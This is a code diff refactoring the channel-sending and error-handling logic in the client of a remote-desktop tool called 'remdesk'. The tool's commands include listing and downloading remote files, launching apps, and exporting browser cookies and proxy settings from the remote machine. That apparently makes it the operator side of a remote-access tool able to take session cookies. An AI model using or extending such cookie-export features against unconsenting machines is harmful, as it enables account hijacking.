@@ -63,52 +63,82 @@
     return `${size.toFixed(size >= 10 || index === 0 ? 0 : 1)} ${units[index]}`;
   }
 
-  async function requestRemoteList(path) {
-    if (!remdesk.ensureChannelOpen()) {
-      remdesk.setRemoteStatus("Data channel not ready", "warn");
-      return;
+  function getOpenChannel() {
+    const channel = state.controlChannel;
+    if (!channel || channel.readyState !== "open") {
+      return null;
     }
+    return channel;
+  }
+
+  async function sendChannelPayload(payload, onNotReady, onError) {
+    const channel = getOpenChannel();
+    if (!channel) {
+      if (onNotReady) {
+        onNotReady();
+      }
+      return false;
+    }
+    try {
+      const message = await remdesk.encodeOutgoing(payload);
+      if (channel.readyState !== "open") {
+        if (onNotReady) {
+          onNotReady();
+        }
+        return false;
+      }
+      channel.send(message);
+      return true;
+    } catch (error) {
+      if (onError) {
+        onError(error);
+      }
+      return false;
+    }
+  }
+
+  async function requestRemoteList(path) {
     state.remoteCurrentPath = path || ".";
-    dom.remotePathInput.value = state.remoteCurrentPath;
+    if (dom.remotePathInput) {
+      dom.remotePathInput.value = state.remoteCurrentPath;
+    }
     remdesk.setRemoteStatus("Loading...", "warn");
     remdesk.clearStorageTimeout();
     state.storageTimer = setTimeout(() => {
       remdesk.setRemoteStatus("Storage request timed out", "bad");
       state.storageTimer = null;
     }, STORAGE_TIMEOUT_MS);
-    try {
-      const message = await remdesk.encodeOutgoing({
-        action: "list_files",
-        path: state.remoteCurrentPath
-      });
-      state.controlChannel.send(message);
-    } catch (error) {
-      remdesk.setRemoteStatus(`E2EE error: ${error.message}`, "bad");
-      remdesk.clearStorageTimeout();
-    }
+    await sendChannelPayload(
+      { action: "list_files", path: state.remoteCurrentPath },
+      () => {
+        remdesk.setRemoteStatus("Data channel not ready", "warn");
+        remdesk.clearStorageTimeout();
+      },
+      (error) => {
+        remdesk.setRemoteStatus(`E2EE error: ${error.message}`, "bad");
+        remdesk.clearStorageTimeout();
+      }
+    );
   }
 
   async function requestDownload(path) {
-    if (!remdesk.ensureChannelOpen()) {
-      remdesk.setDownloadStatus("Data channel not ready", "warn");
-      return;
-    }
     state.pendingDownload = {
       path,
       name: getBaseName(path),
       kind: "file"
     };
     remdesk.setDownloadStatus(`Downloading ${state.pendingDownload.name}`, "warn");
-    try {
-      const message = await remdesk.encodeOutgoing({
-        action: "download",
-        path
-      });
-      state.controlChannel.send(message);
-    } catch (error) {
-      remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
-      state.pendingDownload = null;
-    }
+    await sendChannelPayload(
+      { action: "download", path },
+      () => {
+        remdesk.setDownloadStatus("Data channel not ready", "warn");
+        state.pendingDownload = null;
+      },
+      (error) => {
+        remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
+        state.pendingDownload = null;
+      }
+    );
   }
 
   function normalizeCookieList(browsers) {
@@ -137,10 +167,6 @@
   }
 
   async function requestCookieExport(browsers, filenameOverride, retry = false) {
-    if (!remdesk.ensureChannelOpen()) {
-      remdesk.setCookieStatus("Data channel not ready", "warn");
-      return;
-    }
     const normalized = normalizeCookieList(browsers);
     const label = normalized.length ? normalized.join(", ") : "all";
     const filename = filenameOverride || buildCookieFilename(normalized);
@@ -158,24 +184,24 @@
     };
     remdesk.setCookieStatus(`Exporting cookies (${label})`, "warn");
     remdesk.setDownloadStatus(`Exporting cookies (${label})`, "warn");
-    try {
-      const payload = { action: "export_cookies" };
-      if (normalized.length) {
-        payload.browsers = normalized;
-      }
-      const message = await remdesk.encodeOutgoing(payload);
-      state.controlChannel.send(message);
-    } catch (error) {
-      remdesk.setCookieStatus(`E2EE error: ${error.message}`, "bad");
-      state.pendingDownload = null;
+    const payload = { action: "export_cookies" };
+    if (normalized.length) {
+      payload.browsers = normalized;
     }
+    await sendChannelPayload(
+      payload,
+      () => {
+        remdesk.setCookieStatus("Data channel not ready", "warn");
+        state.pendingDownload = null;
+      },
+      (error) => {
+        remdesk.setCookieStatus(`E2EE error: ${error.message}`, "bad");
+        state.pendingDownload = null;
+      }
+    );
   }
 
   async function requestProxyExport(clientId, filenameOverride, retry = false) {
-    if (!remdesk.ensureChannelOpen()) {
-      remdesk.setDownloadStatus("Data channel not ready", "warn");
-      return;
-    }
     const filename = filenameOverride || buildProxyFilename(clientId);
     if (!retry) {
       state.pendingExport = {
@@ -190,38 +216,37 @@
       kind: "proxy"
     };
     remdesk.setDownloadStatus(`Exporting proxy (${filename})`, "warn");
-    try {
-      const message = await remdesk.encodeOutgoing({
-        action: "export_proxy"
-      });
-      state.controlChannel.send(message);
-    } catch (error) {
-      remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
-      state.pendingDownload = null;
-    }
+    await sendChannelPayload(
+      { action: "export_proxy" },
+      () => {
+        remdesk.setDownloadStatus("Data channel not ready", "warn");
+        state.pendingDownload = null;
+      },
+      (error) => {
+        remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
+        state.pendingDownload = null;
+      }
+    );
   }
 
   async function requestAppLaunch(appName) {
-    if (!remdesk.ensureChannelOpen()) {
-      remdesk.setAppStatus("Data channel not ready", "warn");
-      return;
-    }
     if (!state.controlEnabled) {
       remdesk.setAppStatus("Switch to manage mode to launch apps", "warn");
       return;
     }
     state.pendingAppLaunch = appName;
     remdesk.setAppStatus(`Launching ${appName}...`, "warn");
-    try {
-      const message = await remdesk.encodeOutgoing({
-        action: "launch_app",
-        app: appName
-      });
-      state.controlChannel.send(message);
-    } catch (error) {
-      remdesk.setAppStatus(`E2EE error: ${error.message}`, "bad");
-      state.pendingAppLaunch = null;
-    }
+    await sendChannelPayload(
+      { action: "launch_app", app: appName },
+      () => {
+        remdesk.setAppStatus("Data channel not ready", "warn");
+        state.pendingAppLaunch = null;
+      },
+      (error) => {
+        remdesk.setAppStatus(`E2EE error: ${error.message}`, "bad");
+        state.pendingAppLaunch = null;
+      }
+    );
   }
 
   function drainCookieQueue() {
